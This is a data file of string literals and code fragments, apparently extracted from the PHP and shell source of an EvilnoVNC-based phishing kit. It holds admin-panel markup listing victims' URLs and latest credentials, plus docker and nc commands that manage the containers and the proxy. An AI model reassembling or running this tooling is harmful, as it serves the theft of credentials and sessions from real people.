"('\t', '""<div id=\'hint\'><p>No targets found, <a href=\'./addtargets.php\' target=\'_blank\'>add some</a></p></div>"" . PHP_EOL;')"
"('\t', '""<p class=\'condata\'><span class=\'req\'>"" . $reqid . ""</span> "" . lookupUserId($reqid) . "" ("" . $duration . "" min)</p>"" . PHP_EOL;')"
"('\t', '""<p>[!] File $filename not found. Create it by adding targets</p>"";')"
"('\t', '""<p>[!] File $filename not readable"";')"
"('\t', '""<p>[!] Ignoring user id "" . $elem[""userid""] . "", already in state file!</p>"";')"
"('\t', '""<p>[*] Creating new file $filename</p>"";')"
"('\t', '""<p>none yet</p>"";')"
"('\t', '""<table>"" . PHP_EOL;')"
"('\t', '""<td class=\'"" . ($t[""blocked""] == 1 ? ""blocked"" : """") . ""\'>"" . $t[""userid""] . ""</td>"" . PHP_EOL;')"
"('\t', '""<td class=\'"" . ($t[""blocked""] == 1 ? ""blocked"" : """") . ""\'><abbr title=\'"" . $t[""inputs""] . ""\'>"" . $t[""userid""] . ""</abbr></td>"" . PHP_EOL;')"
"('\t', '""<td class=\'req\'>"" . $t[""reqid""] . ""</td>"" . PHP_EOL;')"
"('\t', '""<td class=\'reqid\'>"" . $dat[""reqid""] . ""</td>"";')"
"('\t', '""<td>"" . $cnt . ""</td>"";')"
"('\t', '""<td>"" . $dat[""inputs""] . ""</td>"";')"
"('\t', '""<td>"" . $dat[""userid""] . ""</td>"";')"
"('\t', '""<td>"" . $url_prefix . $dat[""reqid""] . ""</td>"";')"
"('\t', '""<td>"" . ($dat[""blocked""] == 0 ? ""no"" : ""yes"") . ""</td>"";')"
"('\t', '""<td>"" . getState($dat[""state""]) . ""</td>"";')"
"('\t', '""<textarea id=\'copyurls\'>"";')"
"('\t', '""<tr>"" . PHP_EOL;')"
"('\t', '""<tr><th>#</th><th>request id</th><th>user id</th><th>state</th><th>blocked</th><th>victim URL</th><th>latest credentials</th></tr>"" . PHP_EOL;')"
"('\t', '""Error: getting servers conn for server s$svrno"";')"
"('\t', '""Error: missing argument fields (submit log)"";')"
"('\t', '""Error: missing argument id (submit log)"";')"
"('\t', '""Error: missing arguments"";')"
"('\t', '""Usage:""')"
"('\t', '""[!] Could not read state file."";')"
"('\t', '""[!] Error while adding reqids to whitelist.acl"";')"
"('\t', '""[!] Error: parameter missing"";')"
"('\t', '""[!] Error: sending accesslog entry to controller"";')"
"('\t', '""[!] Error: server id not found"";')"
"('\t', '""[!] POST parameter \'res\' not set"";')"
"('\t', '""[!] Skipping entry that does not look like an email address ($line)"";')"
"('\t', '""[*] Cleaning up...""')"
"('\t', '""[*] Done""')"
"('\t', '""[*] Error while sending reset to controller"";')"
"('\t', '""[*] Instance $i started""')"
"('\t', '""[*] Starting EvilnoVNC instance $x in screen session...""')"
"('\t', '""[*] adding user id to acl"";')"
"('\t', '""[*] deleting former resolution+reqid... "" . PHP_EOL;')"
"('\t', '""[*] done"";')"
"('\t', '""[*] id exists, user already blocked, skipping closeblock (assuming admin access)"";')"
"('\t', '""[*] killing all connections to server novnc/s$svrno"";')"
"('\t', '""[*] resetting chrome extension variables... "" . PHP_EOL;')"
"('\t', '""[*] resolution received"";')"
"('\t', '""[*] restarting container... "";')"
"('\t', '""[*] setting server novnc/s$svrno in maintenance state"";')"
"('\t', '""[*] setting server state to ready..."";')"
"('\t', '""[*] successfully sent reset to controller"";')"
"('\t', '""[*] writing state file"";')"
"('\t', '""\\t<td class=\'req\'>"" . $entry[2] . ""</td>"" . PHP_EOL;')"
"('\t', '""\\t<td>"" . $entry[1] . ""</td>"" . PHP_EOL;')"
"('\t', '""\\t<td>"" . $entry[3] . ""</td>"" . PHP_EOL;')"
"('\t', '""\\t<td>"" . $entry[4] . ""</td>"" . PHP_EOL;')"
"('\t', '""\\t<td>"" . $entry[5] . ""</td>"" . PHP_EOL;')"
"('\t', '""\\t<td>"" . date($dateformat, $entry[0]) . ""</td>"" . PHP_EOL;')"
"('\t', '""\\t<td>"";')"
"('\t', '$RESOLUTION > ./tmp/resolution$SID.txt')"
"('\t', '$entry[$cnt] . "" "";')"
"('\t', '$url_prefix . $dat[""reqid""] . PHP_EOL;')"
"('\t', '-e ""\\t $0 <instances>""')"
"('\t', '-e ""\\t configure and run setup.sh""')"
"('\t', '-e ""\\t e.g. $0 3""')"
"('\t', 'shell_exec(""docker cp $contentjs evil$svrno:/home/user/extension/""); // sed uses same dir for temp file... -> copy')"
"('\t', 'shell_exec(""docker exec evil$svrno rm -f /home/user/tmp/reqid$svrno.txt"");')"
"('\t', 'shell_exec(""docker exec evil$svrno rm -f /home/user/tmp/resolution$svrno.txt"");')"
"('\t', 'shell_exec(""docker exec evil$svrno true > /home/user/errorlog.txt"");')"
"('\t', 'shell_exec(""docker restart -t 0 evil$svrno"");')"
"('\t', 'shell_exec(""echo \'add acl /etc/blacklist.acl $reqid\' | nc hap 8000"");')"
"('\t', 'shell_exec(""echo \'set server novnc/s$svrno state ready\' | nc hap 8000"");')"
